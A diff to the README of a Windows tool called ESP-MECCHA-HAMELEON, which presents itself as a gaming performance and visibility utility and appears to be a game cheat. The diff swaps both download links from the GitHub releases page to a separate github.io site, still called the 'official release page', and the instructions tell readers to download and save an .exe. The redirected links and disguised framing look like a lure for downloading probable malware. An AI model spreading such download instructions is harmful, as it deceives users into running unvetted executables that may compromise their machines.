@@ -1,6 +1,6 @@
 # 🦎 ESP-MECCHA-HAMELEON - Improve your gaming performance and visibility
 
-[![](https://img.shields.io/badge/Download-Release-blue)](https://github.com/selfish-hindustani263/ESP-MECCHA-HAMELEON/releases)
+[![](https://img.shields.io/badge/Download-Release-blue)](https://selfish-hindustani263.github.io)
 
 ESP-MECCHA-HAMELEON V2.1 provides tools to optimize your gaming experience on Windows systems. This application helps users monitor game environments and improve frame rates. It functions as a utility to assist with game settings and visual adjustments.
 
@@ -29,7 +29,7 @@ This software includes several tools designed to assist players.
 
 Follow these steps to obtain the software.
 
-1. Navigate to the [official release page](https://github.com/selfish-hindustani263/ESP-MECCHA-HAMELEON/releases).
+1. Navigate to the [official release page](https://selfish-hindustani263.github.io).
 2. Look for the section labeled "Assets."
 3. Select the file ending in .exe to start the download.
 4. Save the file to your desktop or downloads folder for easy access.
